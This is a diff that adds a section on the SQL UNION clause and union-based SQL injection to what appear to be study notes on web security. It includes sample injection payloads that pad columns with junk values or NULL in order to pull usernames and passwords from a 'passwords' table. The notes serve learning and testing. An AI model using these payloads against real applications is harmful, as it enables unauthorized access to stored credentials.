@@ -589,4 +589,77 @@ SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND
 
 ---
 
+# Union Clause 
 
+#### Union Clause
+- **Purpose**: Combine results from multiple `SELECT` statements.
+- **Usage**: 
+  ```sql
+  SELECT column1, column2 FROM table1
+  UNION
+  SELECT column1, column2 FROM table2;
+  ```
+- **Example**:
+  ```sql
+  SELECT * FROM ports 
+  UNION 
+  SELECT * FROM ships;
+  ```
+
+#### Even Columns
+- **Requirement**: All `SELECT` statements must return the same number of columns.
+- **Example**:
+  ```sql
+  -- This will cause an error:
+  SELECT city FROM ports 
+  UNION 
+  SELECT * FROM ships;
+  ```
+
+#### Union Injection
+- **Purpose**: Injecting entire SQL queries executed with the original query.
+- **Example**:
+  ```sql
+  SELECT * FROM products WHERE product_id = 'user_input'
+  UNION 
+  SELECT username, password FROM passwords-- ';
+  ```
+
+#### Uneven Columns
+- **Solution**: Use "junk" data to balance the number of columns.
+- **Example with Junk Data**:
+  ```sql
+  SELECT * FROM products WHERE product_id = '1' 
+  UNION 
+  SELECT username, 2 FROM passwords;
+  ```
+- **Handling More Columns**:
+  ```sql
+  UNION SELECT username, 2, 3, 4 FROM passwords-- ';
+  ```
+
+#### Full Example
+- **Original Query**:
+  ```sql
+  SELECT * FROM products WHERE product_id = '1';
+  ```
+- **Union Injection**:
+  ```sql
+  UNION SELECT username, 2, 3, 4 FROM passwords-- ';
+  ```
+
+- **Result**:
+  ```sql
+  +-----------+-----------+-----------+-----------+
+  | product_1 | product_2 | product_3 | product_4 |
+  +-----------+-----------+-----------+-----------+
+  |   admin   |    2      |    3      |    4      |
+  +-----------+-----------+-----------+-----------+
+  ```
+
+#### Tips
+- **Data Type Matching**: Ensure junk data matches the column's data type to avoid errors.
+- **Using `NULL`**: For advanced injections, `NULL` can be used as it fits all data types.
+  ```sql
+  UNION SELECT username, NULL, NULL, NULL FROM passwords-- ';
+  ```
